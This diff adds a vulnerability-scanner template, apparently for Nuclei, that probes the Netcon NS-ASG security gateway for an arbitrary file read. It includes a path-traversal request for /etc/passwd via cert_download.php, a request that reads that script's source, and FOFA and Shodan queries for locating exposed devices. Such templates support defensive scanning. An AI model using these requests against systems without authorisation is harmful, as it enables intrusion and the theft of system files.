@@ -1,0 +1,33 @@
+id: nsasg-arbitrary-file-read
+
+info:
+  name: NS ASG Arbitrary File Read
+  author: pikpikcu,ritikchaddha
+  severity: high
+  reference:
+    - https://zhuanlan.zhihu.com/p/368054963
+    - http://wiki.xypbk.com/Web安全/网康%20NS-ASG安全网关/网康%20NS-ASG安全网关%20任意文件读取漏洞.md
+  metadata:
+    fofa-query: app="网康科技-NS-ASG安全网关"
+    shodan-query: http.title:“NS-ASG”
+  tags: nsasg,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: body
+        words:
+          - "$certfile"
+          - "application/pdf"
+        condition: and
